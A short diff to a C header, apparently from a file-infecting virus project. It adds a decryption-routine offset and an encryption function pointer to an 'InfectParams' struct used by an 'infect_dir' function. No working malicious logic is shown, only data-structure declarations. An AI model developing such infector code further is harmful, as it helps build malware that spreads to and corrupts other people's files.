@@ -33,6 +33,8 @@ typedef struct s_infect_params {
 	size_t cmpr_len;
 	size_t crypt_off;
 	size_t crypt_len;
+	size_t decrypt_routine_off;
+	void (*encrypt_routine)(char *s, uint64_t n, uint64_t k[2]);
 } InfectParams;
 
 int infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt);
